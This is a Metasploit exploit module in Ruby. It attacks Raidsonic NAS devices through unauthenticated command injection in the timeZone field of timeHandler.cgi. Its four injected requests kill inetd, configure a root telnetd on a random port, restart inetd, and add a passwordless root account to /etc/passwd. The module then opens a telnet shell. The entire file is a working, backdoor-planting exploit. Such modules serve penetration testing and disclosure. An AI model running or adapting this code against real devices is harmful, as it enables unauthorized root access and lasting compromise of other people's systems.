##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ManualRanking # It's backdooring the remote device

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::CommandShell
  include Msf::Exploit::FileDropper

  RESPONSE_PATTERN = "\<FORM\ NAME\=\"form\"\ METHOD\=\"POST\"\ ACTION\=\"\/cgi\/time\/time.cgi\"\ ENCTYPE\=\"multipart\/form-data"

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Raidsonic NAS Devices Unauthenticated Remote Command Execution',
      'Description' => %q{
        Different Raidsonic NAS devices are vulnerable to OS command injection via the web
        interface. The vulnerability exists in timeHandler.cgi, which is accessible without
        authentication. This module has been tested with the versions IB-NAS5220 and
        IB-NAS4220. Since this module is adding a new user and modifying the inetd daemon
        configuration, this module is set to ManualRanking and could cause target instability.
      },
      'Author'      =>
        [
          'Michael Messner <devnull[at]s3cur1ty.de>', # Vulnerability discovery and Metasploit module
          'juan vazquez' # minor help with msf module
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          [ 'OSVDB', '90221' ],
          [ 'EDB', '24499' ],
          [ 'BID', '57958' ],
          [ 'URL', 'http://www.s3cur1ty.de/m1adv2013-010' ]
        ],
      'DisclosureDate' => 'Feb 04 2013',
      'Privileged'     => true,
      'Platform'       => 'unix',
      'Payload'     =>
        {
          'Compat'  => {
            'PayloadType'    => 'cmd_interact',
            'ConnectionType' => 'find',
          },
        },
      'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/interact' },
      'Targets'        =>
        [
          [ 'Automatic', { } ],
        ],
      'DefaultTarget'  => 0
      ))

    register_advanced_options(
      [
        OptInt.new('TelnetTimeout', [ true, 'The number of seconds to wait for a reply from a Telnet command', 10]),
        OptInt.new('TelnetBannerTimeout', [ true, 'The number of seconds to wait for the initial banner', 25])
      ], self.class)
  end

  def tel_timeout
    (datastore['TelnetTimeout'] || 10).to_i
  end

  def banner_timeout
    (datastore['TelnetBannerTimeout'] || 25).to_i
  end

  def exploit
    telnet_port = rand(32767) + 32768

    print_status("#{rhost}:#{rport} - Telnet port: #{telnet_port}")

    #first request
    cmd = "killall inetd"
    cmd = Rex::Text.uri_encode(cmd)
    print_status("#{rhost}:#{rport} - sending first request - killing inetd")

    res = request(cmd)
    #no server header or something that we could use to get sure the command is executed
    if (!res or res.code != 200 or res.body !~ /#{RESPONSE_PATTERN}/)
      fail_with(Failure::Unknown, "#{rhost}:#{rport} - Unable to execute payload")
    end

    #second request
    inetd_cfg = rand_text_alpha(8)
    cmd = "echo \"#{telnet_port} stream tcp nowait root /usr/sbin/telnetd telnetd\" > /tmp/#{inetd_cfg}"
    cmd = Rex::Text.uri_encode(cmd)
    print_status("#{rhost}:#{rport} - sending second request - configure inetd")

    res = request(cmd)
    #no server header or something that we could use to get sure the command is executed
    if (!res or res.code != 200 or res.body !~ /#{RESPONSE_PATTERN}/)
      fail_with(Failure::Unknown, "#{rhost}:#{rport} - Unable to execute payload")
    end
    register_file_for_cleanup("/tmp/#{inetd_cfg}")

    #third request
    cmd = "/usr/sbin/inetd /tmp/#{inetd_cfg}"
    cmd = Rex::Text.uri_encode(cmd)
    print_status("#{rhost}:#{rport} - sending third request - starting inetd and telnetd")

    res = request(cmd)
    #no server header or something that we could use to get sure the command is executed
    if (!res or res.code != 200 or res.body !~ /#{RESPONSE_PATTERN}/)
      fail_with(Failure::Unknown, "#{rhost}:#{rport} - Unable to execute payload")
    end

    #fourth request
    @user = rand_text_alpha(6)
    cmd = "echo \"#{@user}::0:0:/:/bin/ash\" >> /etc/passwd"
    cmd = Rex::Text.uri_encode(cmd)
    print_status("#{rhost}:#{rport} - sending fourth request - configure user #{@user}")

    res = request(cmd)
    #no server header or something that we could use to get sure the command is executed
    if (!res or res.code != 200 or res.body !~ /#{RESPONSE_PATTERN}/)
      fail_with(Failure::Unknown, "#{rhost}:#{rport} - Unable to execute payload")
    end

    print_status("#{rhost}:#{rport} - Trying to establish a telnet connection...")
    ctx = { 'Msf' => framework, 'MsfExploit' => self }
    sock = Rex::Socket.create_tcp({ 'PeerHost' => rhost, 'PeerPort' => telnet_port.to_i, 'Context' => ctx })

    if sock.nil?
      fail_with(Failure::Unknown, "#{rhost}:#{rport} - Backdoor service has not been spawned!!!")
    end

    add_socket(sock)

    print_status("#{rhost}:#{rport} - Trying to establish a telnet session...")
    prompt = negotiate_telnet(sock)
    if prompt.nil?
      sock.close
      fail_with(Failure::Unknown, "#{rhost}:#{rport} - Unable to establish a telnet session")
    else
      print_good("#{rhost}:#{rport} - Telnet session successfully established...")
    end

    handler(sock)

  end

  def request(cmd)

    uri = '/cgi/time/timeHandler.cgi'

    begin
      res = send_request_cgi({
        'uri'    => uri,
        'method' => 'POST',
        #not working without setting encode_params to false!
        'encode_params' => false,
        'vars_post' => {
          "month"        => "#{rand(12)}",
          "date"         => "#{rand(30)}",
          "year"         => "20#{rand(99)}",
          "hour"         => "#{rand(12)}",
          "minute"       => "#{rand(60)}",
          "ampm"         => "PM",
          "timeZone"     => "Amsterdam`#{cmd}`",
          "ntp_type"     => "default",
          "ntpServer"    => "none",
          "old_date"     => " 1 12007",
          "old_time"     => "1210",
          "old_timeZone" => "Amsterdam",
          "renew"        => "0"
          }
        })
      return res
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unknown, "#{rhost}:#{rport} - Could not connect to the webservice")
    end
  end

  def negotiate_telnet(sock)
    login = read_telnet(sock, "login: $")
    if login
      sock.put("#{@user}\r\n")
    end
    return read_telnet(sock, "> $")
  end

  def read_telnet(sock, pattern)
    begin
      Timeout.timeout(banner_timeout) do
        while(true)
          data = sock.get_once(-1, tel_timeout)
          return nil if not data or data.length == 0
          if data =~ /#{pattern}/
            return true
          end
        end
      end
    rescue ::Timeout::Error
      return nil
    end
  end
end